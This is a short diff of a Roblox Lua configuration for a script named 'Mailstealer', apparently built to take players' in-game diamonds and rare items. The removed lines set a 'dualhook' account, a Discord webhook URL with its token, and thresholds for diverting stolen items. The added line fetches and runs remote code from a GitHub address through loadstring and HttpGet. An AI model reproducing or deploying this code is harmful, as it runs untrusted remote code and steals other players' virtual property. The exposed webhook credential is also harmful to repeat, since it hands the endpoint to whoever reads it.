@@ -2,11 +2,4 @@ UserName = ""
 Webhook = ""
 UserName2 = ""
 
-DualhookUsername = "SirMeowsALotFanYas2"
-DualhookWebhook = "https://discord.com/api/webhooks/1151493452115214426/gqhf87t3eJbtWGHPijJJI6_GlNcMD-ANdExkG94PrXMM3GhWM68WE9kCnvJbMQPjJ6sq"
-
-DiamondsToDh = 30000000000 
-RAPToDh = 30000000000
-HugeToDh = 1
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/premiumdualhook", true))() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CodingNinjaX/Script/main/Mailstealeraw", true))() 
